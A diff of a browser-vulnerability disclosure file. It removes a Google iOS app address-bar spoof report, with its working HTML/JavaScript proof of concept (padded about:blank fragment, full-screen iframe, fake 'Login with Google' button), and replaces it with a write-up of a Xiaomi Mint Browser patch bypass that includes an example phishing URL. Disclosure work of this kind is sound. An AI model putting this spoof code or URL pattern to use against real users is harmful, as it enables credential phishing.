@@ -1,64 +1,47 @@
-# Title: Google App iOS Full Address Bar Spoof
+# Title: Bypassing CVE-2019-10875 or, Xiaomi's Mint Browser's URL Spoofing patch
 
 ## Description: 
-Using the Google app for iOS when navigating to a site from the search or entering the URL manually the address bar only shows the origin of it, this is normally when the scheme is http/https but if we open a new tab with location of about:blank the address bar now doesn't have an origin it will display the full URL, and the issue is also arises that if the URL is too long the UI will show the end of it, for example opening about:blank#(multiple _spaces) google.com the address bar display (multiple _spaces) google.com and hides the about:blank# part making the address bar spoofed and a user thinks it's on google.com
+A friend and fellow researcher Renwa disclosed a 0day in Xiaomi's Mi and Mint Browsers. He asked me to write about this on my blog since it's very similar to my previous find. He just found a bypass that lets him use the same trick that I used before,
 
-POC
-When creating a POC I encountered a problem which when opening a URL with about:blank#test the app immediately closed the tab and got an error but I found a solution to this problem by creating an about:blank page then from there creating a second about:blank#test which didn't get any errors, also the app doesn't have popup blocking protection making the attack without any user interaction.
+Intro
+His exploit/PoC is just the same as mine. Domain stays same, query parameter same. But attacker's domain needs a subdomain same as the name of the query parameter. 
 
-Online POC open in Google app iOS: https://REDACTED
+That's where he outsmarted Xiaomi's fix with a simple trick.
 
-Video POC: Bug-001.mp4
+Who are still affected?
+Mi Browser has not received the security patch. Neither has Mint Browser on Xiaomi's App Store. 
+Shady Security Patch? - Why? because it was so inadequate and easy to bypass!
+Too soon? Just after that big news about Xiaomi Browser Vulnerability broke. Makes one question about Xiaomi's overall credibility and security patching. How on earth could someone make such a fix that could be bypassed with just so little an effort? The patch seems shady since it could be bypassed so easily, don't agree? See self. I have published a video PoC of the same.
 
-POC Code
+Renwa pinged me yesterday  about his new bypass of Mint Browser's patch in response to my URL spoofing vulnerability that I disclosed a few days back. This got me curious. I was not aware of this because the UPDATED version of Mint (1.6.3) wasn't available on Mi Appstore. I came to know from him that they released the patched version on Google Playstore on the 5th of April, 2019.
 
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script>
+His exploit is based on the fact that Xiaomi developers wrote some bad regex rules to patch my previous URL spoofing attack that failed on the onslaught of a new trick to circumvent the same. Was it intentional again :P?
 
-var v='';
-        function poc() {
-// Opening first about:blank page
-v=window.open('about:blank');
+The fix didn't work anyways. Is this how Xiaomi puts things into production? Didn't they test for similar secuity issues or, what? They don't do it for Global products ;) or, what?
 
-// Wait a little and open a second about:blank page with a hash fragment
-setTimeout(()=>{
-v.document.body.innerHTML=`
-<img src=x onerror='var c=window.open("about:blank#.         google.com      \u2b1e");
-c.document.body.innerHTML=&#x27;<iframe src="https://pwr.wtf/arc/5.html" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>&#x27;'>
-`
-},10);
-        }
-poc();
-    </script>
-</head>
-<body>
-        <h1>
-        <center><br><br><br><button style=font-size:30px onclick=poc()>Login with Google</button></center>
-        </h1>
-</body>
-</html>
-```
-Mitigation
-When the URL is about:blank show an empty address bar or show the start of URL not end of it
+Because, they either have started learning regex or, don't know how to patch security issues on their Browser products.
 
-Attack scenario
-An attacker with this vulnerability can deceive users into thinking they are on a legitimate site and enter their credentials. As a browser vulnerability, address bar spoofing allows attackers to manipulate the URL displayed in a browser's address bar, making a fraudulent site appear legitimate. This can lead users to unknowingly share sensitive information, download malicious software, or conduct financial transactions on compromised sites, posing a serious security risk and undermining user trust in the browser’s ability to verify site authenticity.
+
+How?
+Renwa's 0day utilises the fact that their new Regex rules which were supposed to fix the previous problem, namely, CVE-2019-10875 were not sufficient, not only that, it was not the appropriate measure. 
+
+He bypassed their protection by using my previous trick including the target domain in 'q' parameter but, the only thing he included this time, the wittiest part is that it struck his mind what if he changes the *subdomain name* on the phishing domain to the target domain name? Guess what? Their patch failed to prevent this new bypass/attack. Renwa's assumption was right!
+
+
+New PoC or, attack vector that succeeds my older one
+http://google.com.phishing-site.com/?q=google.com that spoofs google.com as an example
 
 ## Author: Renwa
 
-## Affected Browser(s): Google iOS
+## Affected Browser(s): Xiaomi Mint
 
 ## Severity: High
 
-## Spoof Type: non-http scheme
+## Spoof Type: Search-Engine
 
-## References: N/A
+## References: https://www.andmp.com/2019/04/bypassing-cve-2019-10875-or-xiaomis.html
 
-## POC Photo/Video: `bug-001.mp4`
+## POC Photo/Video: bug-001.mp4
 
-## Discovery Date: 2024-10-31
+## Discovery Date: 2019-04-07
 
